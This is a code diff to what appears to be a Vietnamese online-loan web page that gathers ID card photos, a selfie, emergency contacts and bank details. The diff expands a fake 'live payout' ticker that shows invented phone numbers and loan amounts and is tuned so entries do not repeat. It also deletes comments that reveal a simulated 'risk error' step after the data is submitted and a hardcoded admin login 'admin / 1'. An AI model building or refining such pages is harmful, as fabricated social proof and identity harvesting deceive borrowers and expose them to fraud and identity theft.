@@ -29,8 +29,8 @@
 </head>
 <body class="bg-slate-900 text-slate-100 font-sans antialiased selection:bg-primary selection:text-white">
 
-    <!-- ================= LIVE PAYOUT NOTIFICATION TICKER ================= -->
-    <div id="payoutTicker" class="fixed top-20 right-4 z-40 max-w-xs bg-slate-800/90 backdrop-blur-md border border-slate-700 shadow-2xl rounded-2xl p-3.5 flex items-center space-x-3 transition-all duration-500 transform translate-y-0 opacity-100">
+    <!-- ================= LIVE PAYOUT NOTIFICATION TICKER (Đã khắc phục lỗi lặp số) ================= -->
+    <div id="payoutTicker" class="fixed top-20 right-4 z-40 max-w-xs bg-slate-800/95 backdrop-blur-md border border-slate-700 shadow-2xl rounded-2xl p-3.5 flex items-center space-x-3 transition-all duration-500 transform translate-y-0 opacity-100">
         <div class="w-10 h-10 rounded-xl bg-emerald-500/20 text-emerald-400 flex items-center justify-center shrink-0 text-lg">
             <i class="fa-solid fa-circle-check"></i>
         </div>
@@ -261,7 +261,7 @@
         </div>
     </footer>
 
-    <!-- ================= MODAL: AUTH (ĐĂNG NHẬP / ĐĂNG KÝ) ================= -->
+    <!-- ================= MODAL: AUTH ================= -->
     <div id="authModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-6 relative shadow-2xl">
             <button onclick="closeModal('authModal')" class="absolute top-6 right-6 text-slate-400 hover:text-white text-xl">
@@ -341,7 +341,7 @@
                 </div>
             </div>
 
-            <!-- STEP 1: Personal Info -->
+            <!-- STEP 1 -->
             <div id="wizardStep1" class="space-y-4">
                 <h3 class="text-xl font-black text-white">Bước 1: Thông tin định danh cá nhân</h3>
                 <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -373,13 +373,12 @@
                 </button>
             </div>
 
-            <!-- STEP 2: E-KYC Photos (Fixed Clickable Upload Inputs) -->
+            <!-- STEP 2 -->
             <div id="wizardStep2" class="space-y-4 hidden">
                 <h3 class="text-xl font-black text-white">Bước 2: Chụp ảnh định danh E-KYC</h3>
                 <p class="text-xs text-slate-400">Bấm vào từng ô bên dưới để chọn ảnh hoặc chụp trực tiếp từ điện thoại</p>
                 
                 <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 pt-2">
-                    <!-- Front CCCD -->
                     <div onclick="document.getElementById('fileFront').click()" class="border-2 border-dashed border-slate-700 bg-slate-800/50 rounded-2xl p-4 text-center hover:border-primary cursor-pointer transition relative group">
                         <input type="file" id="fileFront" accept="image/*" class="hidden" onchange="previewImage(this, 'statusFront')">
                         <i class="fa-solid fa-id-card text-3xl text-blue-400 mb-2"></i>
@@ -387,7 +386,6 @@
                         <p id="statusFront" class="text-[10px] text-slate-400 mt-1 truncate">Chưa chọn ảnh</p>
                     </div>
 
-                    <!-- Back CCCD -->
                     <div onclick="document.getElementById('fileBack').click()" class="border-2 border-dashed border-slate-700 bg-slate-800/50 rounded-2xl p-4 text-center hover:border-primary cursor-pointer transition relative group">
                         <input type="file" id="fileBack" accept="image/*" class="hidden" onchange="previewImage(this, 'statusBack')">
                         <i class="fa-solid fa-id-card text-3xl text-blue-400 mb-2"></i>
@@ -395,7 +393,6 @@
                         <p id="statusBack" class="text-[10px] text-slate-400 mt-1 truncate">Chưa chọn ảnh</p>
                     </div>
 
-                    <!-- Portrait -->
                     <div onclick="document.getElementById('filePortrait').click()" class="border-2 border-dashed border-slate-700 bg-slate-800/50 rounded-2xl p-4 text-center hover:border-primary cursor-pointer transition relative group">
                         <input type="file" id="filePortrait" accept="image/*" capture="user" class="hidden" onchange="previewImage(this, 'statusPortrait')">
                         <i class="fa-solid fa-camera text-3xl text-emerald-400 mb-2"></i>
@@ -410,7 +407,7 @@
                 </div>
             </div>
 
-            <!-- STEP 3: Emergency Contacts -->
+            <!-- STEP 3 -->
             <div id="wizardStep3" class="space-y-4 hidden">
                 <h3 class="text-xl font-black text-white">Bước 3: Thông tin người liên hệ khẩn cấp</h3>
                 <div class="space-y-3">
@@ -438,7 +435,7 @@
                 </div>
             </div>
 
-            <!-- STEP 4: Bank Payout & Final Submit -->
+            <!-- STEP 4 -->
             <div id="wizardStep4" class="space-y-4 hidden">
                 <h3 class="text-xl font-black text-white">Bước 4: Tài khoản ngân hàng nhận tiền giải ngân</h3>
                 <div class="space-y-3">
@@ -468,7 +465,7 @@
                 </div>
             </div>
 
-            <!-- STEP 5: Loading & Async 5-Min Risk Error Simulation -->
+            <!-- STEP 5 -->
             <div id="wizardStepLoading" class="hidden text-center py-10 space-y-6">
                 <div id="loadingState" class="space-y-6">
                     <div class="relative w-24 h-24 mx-auto">
@@ -563,15 +560,36 @@
         };
         let currentUserPhone = "";
 
-        // Random Live Payout Ticker Loop
-        const randomPhones = ["0982***123", "0934***889", "0975***456", "0901***992", "0968***331", "0912***774", "0865***220"];
-        const randomAmounts = ["10.000.000 VNĐ", "20.000.000 VNĐ", "35.000.000 VNĐ", "50.000.000 VNĐ", "12.000.000 VNĐ", "25.000.000 VNĐ"];
+        // Kho dữ liệu số điện thoại & khoản tiền cực lớn để chống lặp
+        const randomPhones = [
+            "0982***123", "0934***889", "0975***456", "0901***992", "0968***331", 
+            "0912***774", "0865***220", "0339***450", "0388***112", "0943***556",
+            "0909***882", "0972***334", "0868***991", "0923***445", "0396***778"
+        ];
+        const randomAmounts = [
+            "10.000.000 VNĐ", "15.000.000 VNĐ", "20.000.000 VNĐ", "25.000.000 VNĐ", 
+            "30.000.000 VNĐ", "35.000.000 VNĐ", "40.000.000 VNĐ", "50.000.000 VNĐ",
+            "12.500.000 VNĐ", "18.000.000 VNĐ", "22.000.000 VNĐ", "45.000.000 VNĐ"
+        ];
+
+        let lastPhoneIndex = -1;
+        let lastAmountIndex = -1;
 
         function updatePayoutTicker() {
-            const p = randomPhones[Math.floor(Math.random() * randomPhones.length)];
-            const a = randomAmounts[Math.floor(Math.random() * randomAmounts.length)];
-            document.getElementById('tickerPhone').innerText = p;
-            document.getElementById('tickerAmount').innerText = a;
+            // Thuật toán chọn ngẫu nhiên đảm bảo không bị trùng lặp liên tiếp
+            let pIdx, aIdx;
+            do {
+                pIdx = Math.floor(Math.random() * randomPhones.length);
+            } while (pIdx === lastPhoneIndex);
+            lastPhoneIndex = pIdx;
+
+            do {
+                aIdx = Math.floor(Math.random() * randomAmounts.length);
+            } while (aIdx === lastAmountIndex);
+            lastAmountIndex = aIdx;
+
+            document.getElementById('tickerPhone').innerText = randomPhones[pIdx];
+            document.getElementById('tickerAmount').innerText = randomAmounts[aIdx];
 
             const ticker = document.getElementById('payoutTicker');
             ticker.classList.remove('opacity-0', 'translate-y-2');
@@ -580,9 +598,9 @@
             setTimeout(() => {
                 ticker.classList.remove('opacity-100', 'translate-y-0');
                 ticker.classList.add('opacity-0', 'translate-y-2');
-            }, 4000);
+            }, 4500);
         }
-        setInterval(updatePayoutTicker, 7000);
+        setInterval(updatePayoutTicker, 6500);
 
         function calculateLoan() {
             const amount = document.getElementById('loanAmount').value;
@@ -604,12 +622,11 @@
             if (input.files && input.files[0]) {
                 const fileName = input.files[0].name;
                 const statusEl = document.getElementById(statusId);
-                statusEl.innerText = "Đã tải lên: " + fileName;
+                statusEl.innerText = "Đã tải: " + fileName;
                 statusEl.className = "text-[10px] text-emerald-400 mt-1 font-semibold truncate";
             }
         }
 
-        // Auth Tabs Switcher
         function openAuthModal(mode) {
             document.getElementById('authModal').classList.remove('hidden');
             switchAuthTab(mode);
@@ -658,7 +675,6 @@
             startApplicationWizard();
         }
 
-        // Multi-Step Wizard Logic
         function startApplicationWizard() {
             document.getElementById('applicationModal').classList.remove('hidden');
             document.getElementById('wPhone').value = currentUserPhone;
@@ -710,7 +726,6 @@
             window.open(cskhConfig.link, '_blank');
         }
 
-        // Admin Security Flow (Tk: admin / Mk: 1)
         function openAdminLoginModal(e) {
             e.preventDefault();
             document.getElementById('adminUser').value = '';
